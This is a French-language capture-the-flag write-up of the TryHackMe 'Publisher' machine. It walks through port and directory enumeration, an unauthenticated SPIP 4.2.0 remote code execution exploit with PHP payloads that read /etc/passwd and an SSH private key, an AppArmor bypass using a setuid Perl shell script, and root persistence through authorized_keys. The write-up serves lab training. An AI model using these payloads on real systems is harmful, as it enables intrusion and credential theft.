---
title: Publisher - TryHackMe
date: 2024-07-17 21:07:05 -0400
description: La machine "Publisher" sur TryHackMe est un environnement simulé hébergeant certains services. Grâce à une série de techniques d'énumération, y compris l'exploration des répertoires et l'identification de la version, une vulnérabilité est découverte, permettant l'exécution de code à distance (RCE). Les tentatives d'escalade des privilèges à l'aide d'un binaire personnalisé sont entravées par un accès restreint aux fichiers et répertoires critiques du système, ce qui nécessite une exploration plus approfondie du profil de sécurité du système pour finalement exploiter une faille qui permet l'exécution d'un shell bash non confiné et d'atteindre l'escalade des privilèges.
categories: [TryHackMe]
tags: [THM, CTFs, Hacking]
image:
    path: https://i.ibb.co/wNrVt8F/publisher.jpg
---


- **[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


<h2 style="color: orange;">Reconnaissance</h2>

Pour commencer. j'utilise `rustscan` pour voir quelles ports sont ouvert dans cet Machine

```console
# rustscan --ulimit 5000 --range 1-65535 -a $ip -- -sV 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.83.157:22
Open 10.10.83.157:80
```

Deux port sont ouverte et qui sont:

- **Port: 22**
- **Port: 80**

Un site internet deja disponibles dans le port 80.

![website](https://i.ibb.co/bbJbfw8/spip.png)

Je vais faire de l'enumeration de fichier dans ce site que je viens de decouvrir avec `ffuf`


```console
└─$ ffuf -u http://10.10.83.157/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
______________________


spip                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 967ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 3598ms
```

Dans le site web je trouve un **CMS** du nom de *SPIP* avec la version `4.2.0`

- [SPIP v4.2.0 - Remote Code Execution (Unauthenticated)](https://www.exploit-db.com/exploits/51536)


```console
$ searchsploit -m 51536                
  Exploit: SPIP v4.2.0 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/51536
     Path: /usr/share/exploitdb/exploits/php/webapps/51536.py
    Codes: CVE-2023-27372
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/bloman/CTFs/Boot2/TryHackMe/exploits/51536.py

$ python3 spip_rce.py -h
usage: spip_rce.py [-h] -u URL -c COMMAND [-v]

Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     SPIP application base URL
  -c COMMAND, --command COMMAND
                        Command to execute
  -v, --verbose         Verbose mode. (default: False)

```

Lorsque j'execute cet exploit:

```console
$ python3 spip_rce.py -u http://10.10.83.157/spip -c 'id' -v
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:35:"<?php system('cat /etc/passwd'); ?>";


```

En lisant ce [template nuclei](https://github.com/projectdiscovery/nuclei-templates/pull/7510/files) je comprends que la vulnerabilite se trouve dans le parametre `oubli` lorsqu'on voudrais se connecter sur le CMS

![Oubli](https://i.ibb.co/z6NQhpf/oubli.png)

À partir de là, il est possible de formuler une commande en utilisant la chaîne `"s:19:"<?php phpinfo(); ?>";"`

![calcule](https://i.ibb.co/XWrWY80/s3.png)

Le `s:35` indique ici le nombre de caractères contenus dans les guillemets "". ``""``

![passwd](https://i.ibb.co/SBkqGTt/en.png)

j'ai lu la cle privee `ssh` en utilisant le payload ``s:47:"<?php system('cat /home/think/.ssh/id_rsa'); ?>";`` puis je me suis connecter en tant qu'utilisateur `think`

![id_rsa](https://i.ibb.co/M6zZ03b/ke.png)

```console
└─$ ssh think@10.10.83.157 -i id_rsa 
think@publisher:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)

```

<h2 style="color: orange;">Privilege Escalation</h2>

Je commence par vérifier la version du système.

```console
think@publisher:~$ uname -a
Linux publisher 5.4.0-169-generic #187-Ubuntu SMP Thu Nov 23 14:52:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```
En inspectant les fichiers SUID, je découvre un fichier qui semble suspect.

![suspect suid](https://i.ibb.co/KbPg5HH/suid.png)

J'examine ce fichier suspect à l'aide de la commande `strings` et voici ce que je trouve :

![](https://i.ibb.co/km0jdJ8/sc.png)

```console
think@publisher:/opt$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
think@publisher:/opt$ 
```

Cependant, lorsque j'essaie de télécharger des fichiers sur la machine, je rencontre une restriction d'accès qui m'empêche de créer des répertoires.

```console
think@publisher:/tmp$ mkdir priv
mkdir: cannot create directory ‘priv’: Permission denied
```
![env](https://i.ibb.co/6W7Bqcm/env.png)

En examinant les variables d'environnement, je constate que ce système utilise `ash` comme shell par défaut, comme indiqué par  `SHELL=/usr/sbin/ash`


### Contournement de Shebang AppArmor

>*AppArmor est une amélioration du noyau conçue pour restreindre les ressources disponibles aux programmes via des profils par programme, mettant en œuvre efficacement un contrôle d'accès obligatoire (MAC) en liant directement les attributs de contrôle d'accès aux programmes plutôt qu'aux utilisateurs.*
{: .prompt-info }


En examinant le profil AppArmor associé au shell `ash`, on observe les règles suivantes :

![](https://i.ibb.co/frQ23jz/as.png)

Selon les règles définies dans ce profil, il est clair que l'écriture dans des répertoires tels que `/opt`, `/tmp`, et `/var/tmp` est explicitement interdite. Cependant, il existe une subtilité :

- **Mode "complain"** : Le profil AppArmor pour ash est configuré en mode "complain" (flags=(complain)). Dans ce mode, les violations de règles ne sont pas strictement appliquées ; elles sont plutôt signalées dans les logs sans bloquer réellement l'accès. Cela signifie que bien que les règles spécifient des interdictions d'écriture, ces actions ne sont pas bloquées de manière stricte, permettant ainsi à l'utilisateur d'écrire dans des répertoires comme `/var/tmp`.

En mode "complain", les protections AppArmor sont moins strictes, ce qui permet à des utilisateurs malveillants ou non autorisés de contourner certaines restrictions. Cela explique pourquoi, malgré la présence d'une règle interdisant l'écriture dans `/var/tmp`, vous êtes toujours capable d'y écrire.

- Pour contourner la protection du Shebang AppArmor, j'utilise ce script suivant :

```console
#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"
```

Je vais écrire et exécuter ce script dans le répertoire `/var/tmp`, ce qui me permettra de contourner les restrictions imposées par AppArmor.

![Bypass AppArmor](https://i.ibb.co/j69skvC/bypass.png)

Après avoir contourné AppArmor, je peux désormais écrire dans le fichier `/opt/run_container.sh` sans aucune restriction, ce qui me permet d'élever mes privilèges en utilisant le SUID `/usr/sbin/run_container`.

![ssh](https://i.ibb.co/gtnSwjc/ssh.png)

Pour finaliser, j'ai ajouté la clé Public SSH de mon utilisateur dans le fichier `authorized_keys` de l'utilisateur `root`, me permettant ainsi de me connecter sans mot de passe.

![Rooted](https://i.ibb.co/9tT6SS8/root.png)



<h2 style="color: orange;">Ressources supplementaires</h2>
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
- [Nuclei](https://github.com/projectdiscovery/nuclei-templates/pull/7510/files)
- [AppArmor Bypass](https://book.hacktricks.xyz/v/fr/linux-hardening/privilege-escalation/docker-security/apparmor)
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
